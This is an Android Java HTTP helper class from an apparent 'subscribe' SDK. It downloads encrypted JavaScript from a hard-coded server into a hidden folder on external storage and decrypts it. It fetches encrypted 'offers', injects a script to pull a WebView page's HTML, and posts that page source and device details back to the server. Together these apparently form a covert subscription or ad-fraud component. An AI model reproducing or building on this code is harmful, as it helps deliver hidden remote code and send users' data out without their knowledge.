package com.xxm.sublibrary.http;

import android.content.Context;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;

//import com.crashlytics.android.answers.Answers;
//import com.crashlytics.android.answers.CustomEvent;
import com.xxm.sublibrary.jni.Ja;
import com.xxm.sublibrary.utils.Uc;
import com.xxm.sublibrary.utils.Ujs;
import com.xxm.sublibrary.utils.Uh;
import com.xxm.sublibrary.utils.Ulog;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Created by xlc on 2017/5/24.
 */

public class H_okhttp {


    public final static String js_get_source = "javascript:window.myObj.getSource(document.getElementsByTagName('html')[0].innerHTML);";

    public static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");

    public static ExecutorService executorService = Executors.newScheduledThreadPool(20);

    /**
     * POST 请求
     *
     * @return
     */
    public static String post(String url, RequestBody requestBody) {

        OkHttpClient okHttpClient = new OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).build();
        Request request = new Request.Builder().url(url).post(requestBody).build();
        Response response;
        try {
            response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return response.body().string();
            }
        } catch (IOException e) {

            Log.e("Adlog", "error:" + e.getMessage());

            e.printStackTrace();
        }
        return null;
    }

    /**
     * get请求
     *
     * @param url
     * @return
     */
    public static String get(String url) {
        OkHttpClient okHttpClient = new OkHttpClient();
        Request request = new Request.Builder().url(url).build();
        Response response;
        try {
            response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return response.body().string();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private static final String POST_ENCODE_OFFER_URL = "http://sp.adpushonline.com:7088/sdk_p%Sa";
    private static final String POST_CONNECT_URL = "http://sp.adpushonline.com:7088/sdk_p%Sb";
    private static final String POST_ENCODE_JS_URL = "http://sp.adpushonline.com:7088/sdk_p%Sd";
    private static final String POST_RESOURCE_URL = "http://sp.adpushonline.com:7088/sdk_p%Sc";


    /***********加密方法**********/

    /**
     * 联网
     *
     * @param objectMap
     * @param context
     */
    public static synchronized void connect(Map<String, Object> objectMap, Context context) {

        JSONObject jsonObject = new JSONObject(objectMap);

        String jsonString = jsonObject.toString();

        String encodeString = H_encode.encrypt(jsonString, Ujs.getInstance(context).getJs_key());


        if (!TextUtils.isEmpty(encodeString)) {

            OkHttpClient okHttpClient = new OkHttpClient.Builder().readTimeout(15, TimeUnit.SECONDS).build();
            RequestBody body = RequestBody.create(JSON, encodeString);

            Request request = new Request.Builder().url(String.format(POST_CONNECT_URL, "/")).post(body).build();
            try {

                Response response = okHttpClient.newCall(request).execute();

                Ulog.w("联网状态: " + response.code());

                try {
                    if (response.isSuccessful()) {

                        Ulog.show("synchronized success");

                        Ulog.w("联网: 成功！");
                    }
                } finally {
                    response.body().close();
                }
            } catch (IOException e) {

                Ulog.w("获取offer有错：" + e.getMessage());
                e.printStackTrace();
            }

        }
    }

    /**
     * 下载
     *
     * @param context
     * @return
     */
    public static boolean post_download_js(Context context) {

        boolean downlod_status = false;


        Map<String, Object> map = new HashMap<>();

        map.put("mcc", Uc.getMcc(context));

        JSONObject jsonObject = new JSONObject(map);

        String jsonString = jsonObject.toString();

        String encode = H_encode.encrypt(jsonString, Ujs.getInstance(context).getJs_key());

        File file_name = null;

        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, ".subscribe");

        if (!file.exists()) {

            file.mkdirs();
        }
        file_name = new File(file.getPath(), "encode.js");
        //
        Ulog.w("post_test: encode" + encode);

        InputStream inputStream = null;

        GZIPInputStream gunzip = null;

        FileOutputStream fileOutputStream = null;

        Response response = null;

        if (!TextUtils.isEmpty(encode)) {

            OkHttpClient okHttpClient = new OkHttpClient.Builder().writeTimeout(20, TimeUnit.SECONDS).build();

            RequestBody body = RequestBody.create(JSON, encode);

            Request request = new Request.Builder().url(String.format(POST_ENCODE_JS_URL, "/")).post(body).header("Content-Encoding", "gzip").build();
            try {

                response = okHttpClient.newCall(request).execute();

                //  Ulog.w("post_test: " + response.code());

                if (response.isSuccessful()) {

                    inputStream = response.body().byteStream();

                    gunzip = new GZIPInputStream(inputStream);

                    if (!file_name.exists()) {
                        file_name.createNewFile();
                    }

                    fileOutputStream = new FileOutputStream(file_name);
                    byte[] buffer = new byte[1024];
                    int n;
                    while ((n = gunzip.read(buffer)) >= 0) {
                        //out.write(buffer, 0, n);
                        fileOutputStream.write(buffer, 0, n);

                    }
                }

                Ujs.getInstance(context).save_download_js_time();

                downlod_status = true;

            } catch (IOException e) {

                downlod_status = false;

                e.printStackTrace();

                if (file_name.exists()) {
                    file_name.delete();
                }

            } finally {

                Ulog.w("do finally");

                if (response != null) {
                    response.body().close();
                }

                if (inputStream != null) {
                    try {
                        inputStream.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                if (fileOutputStream != null) {
                    try {
                        fileOutputStream.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                if (gunzip != null) {
                    try {
                        gunzip.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }

            }
        }
        return downlod_status;
    }

    /**
     * 直接读取加密的JS文件
     */

    public static String get_encode_js(Context context) {

        String SDPath = Environment.getExternalStorageDirectory().getAbsolutePath();

        File file = new File(SDPath, ".subscribe/encode.js");

        if (!file.exists()) {
            return null;
        }

        FileInputStream fileInputStream = null;

        ByteArrayOutputStream out = null;

        try {

            fileInputStream = new FileInputStream(file);

            out = new ByteArrayOutputStream();

            byte[] buffer = new byte[1024];
            int n;
            while ((n = fileInputStream.read(buffer)) >= 0) {

                out.write(buffer, 0, n);

            }
            //解密
            String decode_js_source = H_encode.decrypt(out.toString(), Ujs.getInstance(context).getJs_key());

            //读取解密后的JS
            Ulog.w("post_read_encode_js: 解密后的JS为：" + decode_js_source);

            return decode_js_source;

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (fileInputStream != null) {
                    fileInputStream.close();
                }
                if (out != null) {
                    out.close();
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        return null;
    }


    /**
     * 获取Offer
     */
    public static String post_cache_offer(Context context, Map<String, Object> objectMap) {

        Ulog.w("获取的参数：" + objectMap.toString());

        JSONObject jsonObject = new JSONObject(objectMap);

        String jsonString = jsonObject.toString();

        String offer_decode = null;

        //JNIUtils.getPublicKey(context)

        Ulog.w("加密文件：" + Ujs.getInstance(context).getJs_key());

        String encode = H_encode.encrypt(jsonString, Ujs.getInstance(context).getJs_key());

        Ulog.show("post_test: encode:" + encode);

        if (!TextUtils.isEmpty(encode)) {

            OkHttpClient okHttpClient = new OkHttpClient.Builder().readTimeout(15, TimeUnit.SECONDS).build();
            RequestBody body = RequestBody.create(JSON, encode);

            Request request = new Request.Builder().url(String.format(POST_ENCODE_OFFER_URL, "/")).post(body).build();
            try {

                Response response = okHttpClient.newCall(request).execute();

                Ulog.w("加载offer状态: " + response.code());

                try {
                    if (response.isSuccessful()) {
                        Ulog.w("postSource: 成功！");
                        String offer_encode = response.body().string();
                        Ulog.w("加密前:" + offer_encode);
                        offer_decode = H_encode.decrypt(offer_encode, Ujs.getInstance(context).getJs_key());
                        Ulog.w("解密后:" + offer_decode);
                    }
                } finally {
                    response.body().close();
                }
            } catch (IOException e) {
                Ulog.w("获取offer有错：" + e.getMessage());
                e.printStackTrace();
            }
        }
        return offer_decode;
    }

    /**
     * 用okhttp 回传源码信息
     *
     * @param message
     */
    public static void postSource(Map<String, Object> message, Context context) {

        String offer_id = message.get("offer_id").toString();

        JSONObject jsonObject = new JSONObject(message);

        String jsonString = jsonObject.toString();

        Ulog.w("postSource:源码总长 " + jsonString.length());

        ByteArrayOutputStream arr = null;

        OutputStream zipper = null;

        //加密
        try {

            String encode = H_encode.encrypt(jsonString, Ujs.getInstance(context).getJs_key());

            if (!TextUtils.isEmpty(encode)) {

                byte[] data = encode.getBytes("UTF-8");

                arr = new ByteArrayOutputStream();

                zipper = new GZIPOutputStream(arr);

                zipper.write(data);

                zipper.close();

                OkHttpClient okHttpClient = new OkHttpClient.Builder().writeTimeout(50, TimeUnit.SECONDS).build();

                RequestBody body = RequestBody.create(JSON, arr.toByteArray());

                Request request = new Request.Builder().url(String.format(POST_RESOURCE_URL, "/")).post(body).build();
                Response response = okHttpClient.newCall(request).execute();

                Ulog.show("postSource status:" + response.code());
                try {
                    if (response.isSuccessful()) {
                        Ulog.show("postSource: success");
                        Uh.save(context, offer_id, 1);
                    } else {
                        Ulog.show("postSource: fail");
                    }
                } finally {
                    response.body().close();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
            Ulog.show("postSource: fail:" + e.getMessage());
        } finally {
            try {
                if (arr != null) {
                    arr.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }


}
